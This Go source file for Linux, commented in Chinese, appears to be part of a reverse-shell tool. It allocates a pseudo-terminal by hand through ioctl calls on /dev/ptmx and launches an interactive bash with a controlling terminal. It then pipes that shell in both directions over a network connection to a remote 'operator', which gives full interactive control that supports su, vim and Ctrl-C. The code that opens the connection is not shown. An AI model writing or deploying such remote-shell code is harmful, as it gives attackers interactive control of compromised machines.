//go:build linux

// Linux：fork 前用 /dev/ptmx 手工分配 PTY —— 纯系统调用，无第三方依赖。
// 提示符 / Ctrl-C / su / vim 等依赖真终端的场景全部正常。
package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

const (
	tiocgptn   = 0x80045430 // 取 PTY 从端编号
	tiocsptlck = 0x40045431 // 解锁从端
	tiocswinsz = 0x5414     // 设置窗口大小
)

type winsize struct {
	row, col, xpixel, ypixel uint16
}

func defaultShell() string { return "/bin/bash" }

func openPty() (master, slave *os.File, err error) {
	mfd, err := syscall.Open("/dev/ptmx", syscall.O_RDWR|syscall.O_NOCTTY, 0)
	if err != nil {
		return nil, nil, err
	}
	var n uint32
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(mfd),
		uintptr(tiocgptn), uintptr(unsafe.Pointer(&n))); errno != 0 {
		syscall.Close(mfd)
		return nil, nil, errno
	}
	var zero uint32
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(mfd),
		uintptr(tiocsptlck), uintptr(unsafe.Pointer(&zero))); errno != 0 {
		syscall.Close(mfd)
		return nil, nil, errno
	}
	ws := winsize{row: 30, col: 120}
	syscall.Syscall(syscall.SYS_IOCTL, uintptr(mfd),
		uintptr(tiocswinsz), uintptr(unsafe.Pointer(&ws)))

	sfd, err := syscall.Open(fmt.Sprintf("/dev/pts/%d", n),
		syscall.O_RDWR|syscall.O_NOCTTY, 0)
	if err != nil {
		syscall.Close(mfd)
		return nil, nil, err
	}
	return os.NewFile(uintptr(mfd), "ptmx"), os.NewFile(uintptr(sfd), "pts"), nil
}

func runSession(cfg config, conn net.Conn) {
	master, slave, err := openPty()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[reverse] 分配 PTY 失败: %v\n", err)
		conn.Close()
		return
	}

	cmd := exec.Command(cfg.shell, "-i")
	cmd.Stdin = slave
	cmd.Stdout = slave
	cmd.Stderr = slave
	env := os.Environ()
	if os.Getenv("TERM") == "" {
		env = append(env, "TERM=xterm-256color")
	}
	cmd.Env = env
	// 让 shell 成为会话首进程并拿到控制终端（否则 job control 全废）
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true, Setctty: true, Ctty: 0}

	if err := cmd.Start(); err != nil {
		fmt.Fprintf(os.Stderr, "[reverse] 启动 shell 失败: %v\n", err)
		slave.Close()
		master.Close()
		conn.Close()
		return
	}
	slave.Close() // 父进程不再需要从端

	done := make(chan struct{}, 2)
	go func() { io.Copy(master, conn); done <- struct{}{} }() // 操作员输入 -> 子进程
	go func() { io.Copy(conn, master); done <- struct{}{} }() // 子进程输出 -> 操作员

	<-done // 任一方向断开即拆会话
	_ = cmd.Process.Signal(syscall.SIGHUP)
	time.Sleep(300 * time.Millisecond)
	_ = cmd.Process.Kill()
	master.Close()
	conn.Close()
	_ = cmd.Wait()
	select { // 等另一方向的 goroutine 退出（防御性上限）
	case <-done:
	case <-time.After(2 * time.Second):
	}
}
